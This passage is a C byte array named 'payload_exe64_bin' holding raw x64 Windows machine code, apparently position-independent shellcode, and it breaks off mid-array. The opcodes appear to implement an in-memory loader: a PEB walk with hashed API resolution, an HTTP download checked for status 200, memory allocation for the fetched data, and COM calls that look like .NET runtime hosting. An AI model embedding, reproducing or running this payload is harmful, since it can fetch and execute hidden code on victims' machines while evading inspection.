unsigned char payload_exe64_bin[] = {
  0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48,
  0x83, 0xec, 0x60, 0x44, 0x8b, 0x09, 0x48, 0x8d, 0x71, 0x24, 0x48, 0x8b,
  0xd9, 0x48, 0x8d, 0x51, 0x14, 0x41, 0x83, 0xe9, 0x24, 0x4c, 0x8b, 0xc6,
  0x48, 0x83, 0xc1, 0x04, 0xe8, 0xb3, 0x0a, 0x00, 0x00, 0x48, 0x8b, 0x93,
  0x28, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x8b, 0xac, 0x03, 0x00, 0x00, 0xe8,
  0x5c, 0x09, 0x00, 0x00, 0x48, 0x3b, 0x83, 0xd0, 0x03, 0x00, 0x00, 0x0f,
  0x85, 0xc7, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x93, 0x28, 0x01, 0x00, 0x00,
  0x48, 0x8b, 0x8b, 0x38, 0x01, 0x00, 0x00, 0xe8, 0xdc, 0x08, 0x00, 0x00,
  0x48, 0x89, 0x83, 0x38, 0x01, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x0f, 0x84,
  0xa4, 0x00, 0x00, 0x00, 0x33, 0xff, 0x39, 0x3e, 0x76, 0x19, 0x8b, 0xc7,
  0x48, 0x8d, 0x4b, 0x28, 0x48, 0xc1, 0xe0, 0x05, 0x48, 0x03, 0xc8, 0xff,
  0x93, 0x38, 0x01, 0x00, 0x00, 0xff, 0xc7, 0x3b, 0x3e, 0x72, 0xe7, 0xbe,
  0x01, 0x00, 0x00, 0x00, 0x39, 0xb3, 0x30, 0x01, 0x00, 0x00, 0x76, 0x2d,
  0x48, 0x8b, 0x93, 0x28, 0x01, 0x00, 0x00, 0x8b, 0xfe, 0x48, 0x8b, 0x8c,
  0xfb, 0x38, 0x01, 0x00, 0x00, 0xe8, 0x8a, 0x08, 0x00, 0x00, 0x48, 0x89,
  0x84, 0xfb, 0x38, 0x01, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x55, 0xff,
  0xc6, 0x3b, 0xb3, 0x30, 0x01, 0x00, 0x00, 0x72, 0xd3, 0x83, 0xbb, 0x18,
  0x03, 0x00, 0x00, 0x01, 0x75, 0x0c, 0x48, 0x8b, 0xcb, 0xe8, 0x4e, 0x00,
  0x00, 0x00, 0x85, 0xc0, 0x74, 0x36, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48,
  0x8b, 0xcb, 0xe8, 0xcd, 0x04, 0x00, 0x00, 0x85, 0xc0, 0x74, 0x0d, 0x48,
  0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0xe8, 0x8c, 0x06, 0x00, 0x00,
  0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0xe8, 0xb7, 0x03, 0x00,
  0x00, 0x8b, 0x0b, 0x33, 0xc0, 0x48, 0x8b, 0xfb, 0xf3, 0xaa, 0xeb, 0x03,
  0x83, 0xc8, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x70, 0x48, 0x8b, 0x74, 0x24,
  0x78, 0x48, 0x83, 0xc4, 0x60, 0x5f, 0xc3, 0xcc, 0x40, 0x55, 0x53, 0x56,
  0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0xac,
  0x24, 0x48, 0xff, 0xff, 0xff, 0x48, 0x81, 0xec, 0xb8, 0x01, 0x00, 0x00,
  0x83, 0xa5, 0x08, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x7c, 0x24, 0x40,
  0x33, 0xc0, 0x4c, 0x8d, 0x4c, 0x24, 0x40, 0x48, 0x8b, 0xd9, 0x41, 0xb8,
  0x00, 0x00, 0x00, 0x10, 0x45, 0x33, 0xf6, 0xbe, 0x00, 0x02, 0x60, 0x84,
  0x8d, 0x50, 0x68, 0x8b, 0xca, 0xf3, 0xaa, 0x48, 0x8d, 0x45, 0xb0, 0x89,
  0x54, 0x24, 0x40, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8d, 0x8b, 0x1c,
  0x03, 0x00, 0x00, 0x48, 0x8d, 0x45, 0x30, 0x48, 0x89, 0x45, 0x88, 0x8d,
  0x42, 0x18, 0x33, 0xd2, 0x89, 0x44, 0x24, 0x60, 0x89, 0x45, 0x90, 0xff,
  0x93, 0x88, 0x01, 0x00, 0x00, 0x33, 0xff, 0x85, 0xc0, 0x0f, 0x84, 0x1d,
  0x02, 0x00, 0x00, 0x83, 0x7c, 0x24, 0x54, 0x04, 0xb8, 0x00, 0x32, 0xe0,
  0x84, 0x44, 0x8b, 0xff, 0x89, 0x7c, 0x24, 0x20, 0x41, 0x0f, 0x94, 0xc7,
  0x0f, 0x44, 0xf0, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x33,
  0xc9, 0xff, 0x93, 0x90, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0xe8, 0x48, 0x85,
  0xc0, 0x0f, 0x84, 0xe9, 0x01, 0x00, 0x00, 0x48, 0x89, 0x7c, 0x24, 0x38,
  0x48, 0x8d, 0x55, 0xb0, 0x41, 0x8b, 0xcf, 0x89, 0x7c, 0x24, 0x30, 0xf7,
  0xd9, 0xc7, 0x44, 0x24, 0x28, 0x03, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xc8,
  0x48, 0x89, 0x7c, 0x24, 0x20, 0x66, 0x45, 0x1b, 0xc0, 0x45, 0x33, 0xc9,
  0x66, 0x41, 0x81, 0xe0, 0x6b, 0x01, 0x66, 0x41, 0x83, 0xc0, 0x50, 0xff,
  0x93, 0x98, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0xe0, 0x48, 0x85, 0xc0, 0x0f,
  0x84, 0x50, 0x01, 0x00, 0x00, 0x48, 0x89, 0x7c, 0x24, 0x38, 0x48, 0x8d,
  0x93, 0x9c, 0x03, 0x00, 0x00, 0x89, 0x74, 0x24, 0x30, 0x4c, 0x8d, 0x45,
  0x30, 0x48, 0x89, 0x7c, 0x24, 0x28, 0x45, 0x33, 0xc9, 0x48, 0x8b, 0xc8,
  0x48, 0x89, 0x7c, 0x24, 0x20, 0xff, 0x93, 0xb8, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x11, 0x01, 0x00, 0x00, 0x45,
  0x85, 0xff, 0x74, 0x28, 0x0f, 0xba, 0xe6, 0x0c, 0x73, 0x22, 0x45, 0x8d,
  0x4e, 0x04, 0xc7, 0x85, 0x10, 0x01, 0x00, 0x00, 0x80, 0x33, 0x00, 0x00,
  0x4c, 0x8d, 0x85, 0x10, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xc8, 0x41, 0x8d,
  0x56, 0x1f, 0xff, 0x93, 0xa0, 0x01, 0x00, 0x00, 0x45, 0x33, 0xff, 0x45,
  0x33, 0xc9, 0x45, 0x33, 0xc0, 0x44, 0x89, 0x7c, 0x24, 0x20, 0x33, 0xd2,
  0x48, 0x8b, 0xcf, 0xff, 0x93, 0xc0, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f,
  0x84, 0xba, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x8d, 0x00, 0x01, 0x00, 0x00,
  0xc7, 0x85, 0x00, 0x01, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x4c, 0x8d,
  0x85, 0x08, 0x01, 0x00, 0x00, 0x4c, 0x89, 0x7c, 0x24, 0x20, 0xba, 0x13,
  0x00, 0x00, 0x20, 0x48, 0x8b, 0xcf, 0xff, 0x93, 0xc8, 0x01, 0x00, 0x00,
  0x85, 0xc0, 0x0f, 0x84, 0x87, 0x00, 0x00, 0x00, 0x81, 0xbd, 0x08, 0x01,
  0x00, 0x00, 0xc8, 0x00, 0x00, 0x00, 0x75, 0x7b, 0x48, 0x8d, 0xb3, 0xf8,
  0x03, 0x00, 0x00, 0xc7, 0x85, 0x00, 0x01, 0x00, 0x00, 0x08, 0x00, 0x00,
  0x00, 0x4c, 0x8b, 0xc6, 0x4c, 0x89, 0x3e, 0x4c, 0x8d, 0x8d, 0x00, 0x01,
  0x00, 0x00, 0x4c, 0x89, 0x7c, 0x24, 0x20, 0xba, 0x05, 0x00, 0x00, 0x20,
  0x48, 0x8b, 0xcf, 0xff, 0x93, 0xc8, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x74,
  0x46, 0x48, 0x8b, 0x16, 0x48, 0x85, 0xd2, 0x74, 0x3e, 0x33, 0xc9, 0x45,
  0x8d, 0x4f, 0x04, 0x41, 0xb8, 0x00, 0x30, 0x00, 0x00, 0xff, 0x93, 0x40,
  0x01, 0x00, 0x00, 0x48, 0x89, 0x83, 0x00, 0x04, 0x00, 0x00, 0x48, 0x85,
  0xc0, 0x74, 0x20, 0x44, 0x8b, 0x06, 0x4c, 0x8d, 0x8d, 0x18, 0x01, 0x00,
  0x00, 0x48, 0x8b, 0xd0, 0x44, 0x89, 0xbd, 0x18, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0xcf, 0xff, 0x93, 0xa8, 0x01, 0x00, 0x00, 0x44, 0x8b, 0xf0, 0x48,
  0x8b, 0xcf, 0xff, 0x93, 0xb0, 0x01, 0x00, 0x00, 0x49, 0x8b, 0xcc, 0xff,
  0x93, 0xb0, 0x01, 0x00, 0x00, 0x49, 0x8b, 0xcd, 0xff, 0x93, 0xb0, 0x01,
  0x00, 0x00, 0x45, 0x85, 0xf6, 0x74, 0x40, 0x48, 0x8b, 0xbb, 0x00, 0x04,
  0x00, 0x00, 0x48, 0x8d, 0x93, 0xe8, 0x03, 0x00, 0x00, 0x4c, 0x8b, 0x8b,
  0xf8, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x8b, 0xd8, 0x03, 0x00, 0x00, 0x4c,
  0x8b, 0xc7, 0xe8, 0x3d, 0x07, 0x00, 0x00, 0x48, 0x8b, 0x93, 0x28, 0x01,
  0x00, 0x00, 0x48, 0x8d, 0x8b, 0xac, 0x03, 0x00, 0x00, 0xe8, 0xe6, 0x05,
  0x00, 0x00, 0x48, 0x3b, 0x87, 0x28, 0x03, 0x00, 0x00, 0x75, 0x05, 0x41,
  0x8b, 0xc6, 0xeb, 0x02, 0x33, 0xc0, 0x48, 0x81, 0xc4, 0xb8, 0x01, 0x00,
  0x00, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b,
  0x5d, 0xc3, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48,
  0x89, 0x68, 0x18, 0x48, 0x89, 0x70, 0x20, 0x48, 0x89, 0x50, 0x10, 0x57,
  0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x81, 0xec, 0x30,
  0x01, 0x00, 0x00, 0x48, 0x63, 0x41, 0x3c, 0x48, 0x8b, 0xd9, 0x4d, 0x8b,
  0xf8, 0x8b, 0x8c, 0x08, 0x88, 0x00, 0x00, 0x00, 0x85, 0xc9, 0x74, 0x7b,
  0x48, 0x8d, 0x04, 0x0b, 0x8b, 0x78, 0x18, 0x85, 0xff, 0x74, 0x70, 0x8b,
  0x68, 0x1c, 0x33, 0xc9, 0x44, 0x8b, 0x68, 0x20, 0x48, 0x03, 0xeb, 0x44,
  0x8b, 0x70, 0x24, 0x4c, 0x03, 0xeb, 0x8b, 0x40, 0x0c, 0x4c, 0x03, 0xf3,
  0x4c, 0x8d, 0x04, 0x18, 0x41, 0x8a, 0x00, 0x84, 0xc0, 0x74, 0x14, 0x33,
  0xd2, 0xff, 0xc1, 0x0c, 0x20, 0x88, 0x44, 0x14, 0x20, 0x8b, 0xd1, 0x42,
  0x8a, 0x04, 0x01, 0x84, 0xc0, 0x75, 0xee, 0xc6, 0x44, 0x0c, 0x20, 0x00,
  0x49, 0x8b, 0xd7, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0xe8, 0x33, 0x05, 0x00,
  0x00, 0x4c, 0x8b, 0xe0, 0xff, 0xcf, 0x49, 0x8b, 0xd7, 0x41, 0x8b, 0x4c,
  0xbd, 0x00, 0x48, 0x03, 0xcb, 0xe8, 0x1e, 0x05, 0x00, 0x00, 0x49, 0x33,
  0xc4, 0x48, 0x3b, 0x84, 0x24, 0x68, 0x01, 0x00, 0x00, 0x74, 0x27, 0x85,
  0xff, 0x75, 0xdd, 0x33, 0xc0, 0x4c, 0x8d, 0x9c, 0x24, 0x30, 0x01, 0x00,
  0x00, 0x49, 0x8b, 0x5b, 0x30, 0x49, 0x8b, 0x6b, 0x40, 0x49, 0x8b, 0x73,
  0x48, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c,
  0x5f, 0xc3, 0x41, 0x0f, 0xb7, 0x04, 0x7e, 0x8b, 0x44, 0x85, 0x00, 0x48,
  0x03, 0xc3, 0xeb, 0xd1, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74,
  0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x83, 0xb9, 0x18, 0x03, 0x00,
  0x00, 0x01, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf1, 0x75, 0x33, 0x48, 0x8b,
  0xb9, 0x00, 0x04, 0x00, 0x00, 0x48, 0x85, 0xff, 0x74, 0x27, 0x8b, 0x89,
  0xf8, 0x03, 0x00, 0x00, 0x33, 0xc0, 0xf3, 0xaa, 0x48, 0x8b, 0x8e, 0x00,
  0x04, 0x00, 0x00, 0x33, 0xd2, 0x41, 0xb8, 0x00, 0xc0, 0x00, 0x00, 0xff,
  0x96, 0x48, 0x01, 0x00, 0x00, 0x48, 0x83, 0xa6, 0x00, 0x04, 0x00, 0x00,
  0x00, 0x48, 0x8b, 0x4b, 0x30, 0x48, 0x85, 0xc9, 0x74, 0x0b, 0x48, 0x8b,
  0x01, 0xff, 0x50, 0x10, 0x48, 0x83, 0x63, 0x30, 0x00, 0x48, 0x8b, 0x4b,
  0x28, 0x48, 0x85, 0xc9, 0x74, 0x0b, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x10,
  0x48, 0x83, 0x63, 0x28, 0x00, 0x48, 0x8b, 0x4b, 0x20, 0x48, 0x85, 0xc9,
  0x74, 0x0b, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, 0x48, 0x83, 0x63, 0x20,
  0x00, 0x48, 0x8b, 0x4b, 0x18, 0x48, 0x85, 0xc9, 0x74, 0x0b, 0x48, 0x8b,
  0x01, 0xff, 0x50, 0x10, 0x48, 0x83, 0x63, 0x18, 0x00, 0x48, 0x8b, 0x4b,
  0x10, 0x48, 0x85, 0xc9, 0x74, 0x15, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x58,
  0x48, 0x8b, 0x4b, 0x10, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, 0x48, 0x83,
  0x63, 0x10, 0x00, 0x48, 0x8b, 0x4b, 0x08, 0x48, 0x85, 0xc9, 0x74, 0x0b,
  0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, 0x48, 0x83, 0x63, 0x08, 0x00, 0x48,
  0x8b, 0x0b, 0x48, 0x85, 0xc9, 0x74, 0x0a, 0x48, 0x8b, 0x01, 0xff, 0x50,
  0x10, 0x48, 0x83, 0x23, 0x00, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b,
  0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc,
  0x48, 0x89, 0x5c, 0x24, 0x18, 0x55, 0x56, 0x57, 0x41, 0x56, 0x41, 0x57,
  0x48, 0x83, 0xec, 0x20, 0x83, 0xb9, 0x18, 0x03, 0x00, 0x00, 0x00, 0x4c,
  0x8d, 0xb1, 0x00, 0x04, 0x00, 0x00, 0x4c, 0x8b, 0xfa, 0x48, 0x8b, 0xf1,
  0x74, 0x03, 0x4d, 0x8b, 0x36, 0x48, 0x8d, 0x91, 0xc8, 0x02, 0x00, 0x00,
  0x4d, 0x8b, 0xc7, 0x48, 0x81, 0xc1, 0xb8, 0x02, 0x00, 0x00, 0xff, 0x96,
  0x50, 0x01, 0x00, 0x00, 0x8b, 0xf8, 0x85, 0xc0, 0x0f, 0x88, 0x6e, 0x01,
  0x00, 0x00, 0x49, 0x8b, 0x0f, 0x49, 0x8d, 0x5f, 0x08, 0x4c, 0x8d, 0x86,
  0xd8, 0x02, 0x00, 0x00, 0x4c, 0x8b, 0xcb, 0x49, 0x8d, 0x56, 0x04, 0x48,
  0x8b, 0x01, 0xff, 0x50, 0x18, 0x8b, 0xf8, 0x85, 0xc0, 0x0f, 0x88, 0x49,
  0x01, 0x00, 0x00, 0x48, 0x8b, 0x0b, 0x48, 0x8d, 0x54, 0x24, 0x50, 0x48,
  0x8b, 0x01, 0xff, 0x50, 0x50, 0x8b, 0xf8, 0x85, 0xc0, 0x0f, 0x88, 0x31,
  0x01, 0x00, 0x00, 0x83, 0x7c, 0x24, 0x50, 0x00, 0x0f, 0x84, 0x26, 0x01,
  0x00, 0x00, 0x48, 0x8b, 0x0b, 0x49, 0x8d, 0x6f, 0x10, 0x4c, 0x8d, 0x86,
  0xf8, 0x02, 0x00, 0x00, 0x4c, 0x8b, 0xcd, 0x48, 0x8d, 0x96, 0xe8, 0x02,
  0x00, 0x00, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x48, 0x8b, 0xf8, 0x85, 0xc0,
  0x0f, 0x88, 0xfe, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4d, 0x00, 0x48, 0x8b,
  0x01, 0xff, 0x50, 0x50, 0x8b, 0xf8, 0x85, 0xc0, 0x0f, 0x88, 0xea, 0x00,
  0x00, 0x00, 0x49, 0x8d, 0x4e, 0x44, 0xff, 0x96, 0x78, 0x01, 0x00, 0x00,
  0x48, 0x8b, 0x4d, 0x00, 0x4d, 0x8d, 0x4f, 0x18, 0x45, 0x33, 0xc0, 0x48,
  0x8b, 0xd0, 0x48, 0x8b, 0xd8, 0x4c, 0x8b, 0x11, 0x41, 0xff, 0x52, 0x60,
  0x48, 0x8b, 0xcb, 0x8b, 0xf8, 0xff, 0x96, 0x80, 0x01, 0x00, 0x00, 0x85,
  0xff, 0x0f, 0x88, 0xb5, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x4f, 0x18, 0x48,
  0x8d, 0x96, 0x08, 0x03, 0x00, 0x00, 0x4d, 0x8d, 0x47, 0x20, 0x48, 0x8b,
  0x01, 0xff, 0x10, 0x8b, 0xf8, 0x85, 0xc0, 0x0f, 0x88, 0x97, 0x00, 0x00,
  0x00, 0x83, 0x64, 0x24, 0x5c, 0x00, 0x4c, 0x8d, 0x44, 0x24, 0x58, 0x41,
  0x8b, 0x86, 0x30, 0x03, 0x00, 0x00, 0xb9, 0x11, 0x00, 0x00, 0x00, 0x89,
  0x44, 0x24, 0x58, 0x8d, 0x51, 0xf0, 0xff, 0x96, 0x58, 0x01, 0x00, 0x00,
  0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x6c, 0x4c, 0x8b, 0x40, 0x10,
  0x33, 0xd2, 0x41, 0x39, 0x96, 0x30, 0x03, 0x00, 0x00, 0x76, 0x17, 0x41,
  0x8a, 0x84, 0x16, 0x34, 0x03, 0x00, 0x00, 0x42, 0x88, 0x04, 0x02, 0xff,
  0xc2, 0x41, 0x3b, 0x96, 0x30, 0x03, 0x00, 0x00, 0x72, 0xe9, 0x49, 0x8b,
  0x4f, 0x20, 0x4d, 0x8d, 0x47, 0x28, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0x01,
  0xff, 0x90, 0x68, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x53, 0x10, 0x33, 0xc9,
  0x8b, 0xf8, 0x41, 0x39, 0x8e, 0x30, 0x03, 0x00, 0x00, 0x76, 0x18, 0x41,
  0xc6, 0x84, 0x0e, 0x34, 0x03, 0x00, 0x00, 0x00, 0xc6, 0x04, 0x11, 0x00,
  0xff, 0xc1, 0x41, 0x3b, 0x8e, 0x30, 0x03, 0x00, 0x00, 0x72, 0xe8, 0x48,
  0x8b, 0xcb, 0xff, 0x96, 0x70, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x5c, 0x24,
  0x60, 0xf7, 0xd7, 0xc1, 0xef, 0x1f, 0x8b, 0xc7, 0x48, 0x83, 0xc4, 0x20,
  0x41, 0x5f, 0x41, 0x5e, 0x5f, 0x5e, 0x5d, 0xc3, 0x48, 0x8b, 0xc4, 0x48,
  0x89, 0x58, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x55,
  0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x68, 0xa1,
  0x48, 0x81, 0xec, 0xb0, 0x00, 0x00, 0x00, 0x33, 0xc0, 0x48, 0x8d, 0xb9,
  0x00, 0x04, 0x00, 0x00, 0x48, 0x8b, 0xf2, 0x48, 0x8b, 0xd9, 0x48, 0x89,
  0x45, 0xc7, 0x48, 0x89, 0x45, 0xcf, 0x48, 0x89, 0x45, 0xd7, 0x39, 0x81,
  0x18, 0x03, 0x00, 0x00, 0x74, 0x03, 0x48, 0x8b, 0x3f, 0x48, 0x8d, 0x8f,
  0x84, 0x00, 0x00, 0x00, 0xff, 0x93, 0x78, 0x01, 0x00, 0x00, 0x4c, 0x8b,
  0xf0, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x2f, 0x01, 0x00, 0x00, 0x48, 0x8d,
  0x8f, 0xc4, 0x00, 0x00, 0x00, 0xff, 0x93, 0x78, 0x01, 0x00, 0x00, 0x4c,
  0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x08, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0x4e, 0x28, 0x4c, 0x8d, 0x6e, 0x30, 0x4d, 0x8b, 0xc5, 0x49, 0x8b,
  0xd6, 0x4c, 0x8b, 0x09, 0x41, 0xff, 0x91, 0x88, 0x00, 0x00, 0x00, 0x44,
  0x8b, 0xe0, 0x85, 0xc0, 0x0f, 0x88, 0xdc, 0x00, 0x00, 0x00, 0x44, 0x8b,
  0x87, 0x04, 0x01, 0x00, 0x00, 0x33, 0xf6, 0x45, 0x85, 0xc0, 0x74, 0x78,
  0x8d, 0x4e, 0x0c, 0x33, 0xd2, 0xff, 0x93, 0x60, 0x01, 0x00, 0x00, 0x48,
  0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x74, 0x65, 0x83, 0x65, 0x67, 0x00, 0x83,
  0xbf, 0x04, 0x01, 0x00, 0x00, 0x00, 0x76, 0x58, 0x33, 0xc0, 0x8b, 0xc8,
  0x48, 0xc1, 0xe1, 0x06, 0x48, 0x81, 0xc1, 0x08, 0x01, 0x00, 0x00, 0x48,
  0x03, 0xcf, 0xff, 0x93, 0x78, 0x01, 0x00, 0x00, 0x48, 0x89, 0x45, 0xe7,
  0x4c, 0x8d, 0x45, 0xdf, 0x48, 0x8d, 0x55, 0x67, 0x48, 0x8b, 0xce, 0xb8,
  0x08, 0x00, 0x00, 0x00, 0x66, 0x89, 0x45, 0xdf, 0xff, 0x93, 0x68, 0x01,
  0x00, 0x00, 0x44, 0x8b, 0xe0, 0x85, 0xc0, 0x79, 0x0b, 0x48, 0x8b, 0xce,
  0xff, 0x93, 0x70, 0x01, 0x00, 0x00, 0x33, 0xf6, 0x8b, 0x45, 0x67, 0xff,
  0xc0, 0x89, 0x45, 0x67, 0x3b, 0x87, 0x04, 0x01, 0x00, 0x00, 0x72, 0xaa,
  0x45, 0x85, 0xe4, 0x78, 0x51, 0x49, 0x8b, 0x4d, 0x00, 0x48, 0x8d, 0x45,
  0x17, 0x0f, 0x10, 0x45, 0xc7, 0x45, 0x33, 0xc9, 0x48, 0x89, 0x44, 0x24,
  0x30, 0xf2, 0x0f, 0x10, 0x4d, 0xd7, 0x48, 0x8d, 0x45, 0xf7, 0x4c, 0x8b,
  0x11, 0x41, 0xb8, 0x18, 0x01, 0x00, 0x00, 0x48, 0x89, 0x74, 0x24, 0x28,
  0x49, 0x8b, 0xd7, 0x0f, 0x29, 0x45, 0xf7, 0xf2, 0x0f, 0x11, 0x4d, 0x07,
  0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0xff, 0x92, 0xc8, 0x01, 0x00, 0x00,
  0x48, 0x85, 0xf6, 0x74, 0x09, 0x48, 0x8b, 0xce, 0xff, 0x93, 0x70, 0x01,
  0x00, 0x00, 0x49, 0x8b, 0xcf, 0xff, 0x93, 0x80, 0x01, 0x00, 0x00, 0x49,
  0x8b, 0xce, 0xff, 0x93, 0x80, 0x01, 0x00, 0x00, 0xb8, 0x01, 0x00, 0x00,
  0x00, 0x4c, 0x8d, 0x9c, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x5b,
  0x38, 0x49, 0x8b, 0x73, 0x40, 0x49, 0x8b, 0x7b, 0x48, 0x49, 0x8b, 0xe3,
  0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5d, 0xc3, 0xcc, 0xcc,
  0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48,
  0x83, 0xec, 0x20, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,
  0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xf1, 0x45, 0x33, 0xc9, 0x4c, 0x8b, 0x40,
  0x18, 0x49, 0x8b, 0x58, 0x10, 0xeb, 0x19, 0x4d, 0x85, 0xc9, 0x75, 0x1d,
  0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xc8, 0xe8, 0x62, 0xfa,
  0xff, 0xff, 0x48, 0x8b, 0x1b, 0x4c, 0x8b, 0xc8, 0x48, 0x8b, 0x43, 0x30,
  0x48, 0x85, 0xc0, 0x75, 0xde, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x49, 0x8b,
  0xc1, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3,
  0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
  0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec,
  0x30, 0x45, 0x33, 0xc0, 0x33, 0xf6, 0x33, 0xed, 0x48, 0x8b, 0xda, 0x4c,
  0x8b, 0xf1, 0x42, 0x8a, 0x14, 0x36, 0x84, 0xd2, 0x74, 0x13, 0x83, 0xfe,
  0x40, 0x74, 0x0e, 0x41, 0x8b, 0xc0, 0x41, 0xff, 0xc0, 0xff, 0xc6, 0x88,
  0x54, 0x04, 0x20, 0xeb, 0x50, 0x41, 0x8b, 0xc0, 0x48, 0x8d, 0x54, 0x24,
  0x20, 0x48, 0x03, 0xd0, 0xb9, 0x10, 0x00, 0x00, 0x00, 0x41, 0x2b, 0xc8,
  0x33, 0xc0, 0x48, 0x8b, 0xfa, 0xf3, 0xaa, 0xc6, 0x02, 0x80, 0x41, 0x83,
  0xf8, 0x0c, 0x72, 0x1c, 0x48, 0x8b, 0xd3, 0x48, 0x8d, 0x4c, 0x24, 0x20,
  0xe8, 0x5f, 0x00, 0x00, 0x00, 0x48, 0x33, 0xd8, 0x48, 0x8d, 0x7c, 0x24,
  0x20, 0x33, 0xc0, 0x8d, 0x48, 0x10, 0xf3, 0xaa, 0x8b, 0xc6, 0x41, 0xb8,
  0x10, 0x00, 0x00, 0x00, 0xc1, 0xe0, 0x03, 0x89, 0x44, 0x24, 0x2c, 0xff,
  0xc5, 0x41, 0x83, 0xf8, 0x10, 0x75, 0x13, 0x48, 0x8b, 0xd3, 0x48, 0x8d,
  0x4c, 0x24, 0x20, 0xe8, 0x2c, 0x00, 0x00, 0x00, 0x48, 0x33, 0xd8, 0x45,
  0x33, 0xc0, 0x85, 0xed, 0x0f, 0x84, 0x74, 0xff, 0xff, 0xff, 0x48, 0x8b,
  0x6c, 0x24, 0x48, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48,
  0x8b, 0x74, 0x24, 0x50, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x48, 0x83, 0xc4,
  0x30, 0x41, 0x5e, 0xc3, 0x48, 0x8b, 0xc4, 0x53, 0x48, 0x83, 0xec, 0x10,
  0x0f, 0x10, 0x01, 0x48, 0x89, 0x50, 0x10, 0x8b, 0xca, 0x44, 0x8b, 0x40,
  0x14, 0x45, 0x33, 0xd2, 0x0f, 0x11, 0x04, 0x24, 0x8b, 0x50, 0xf4, 0x44,
  0x8b, 0x58, 0xf0, 0x8b, 0x58, 0xec, 0x44, 0x8b, 0x0c, 0x24, 0x8b, 0xc2,
  0xc1, 0xc9, 0x08, 0x41, 0x03, 0xc8, 0x8b, 0xd3, 0x41, 0x33, 0xc9, 0xc1,
  0xca, 0x08, 0x41, 0x03, 0xd1, 0x41, 0xc1, 0xc0, 0x03, 0x41, 0x33, 0xd2,
  0x41, 0xc1, 0xc1, 0x03, 0x44, 0x33, 0xca, 0x44, 0x33, 0xc1, 0x41, 0xff,
  0xc2, 0x41, 0x8b, 0xdb, 0x44, 0x8b, 0xd8, 0x41, 0x83, 0xfa, 0x1b, 0x72,
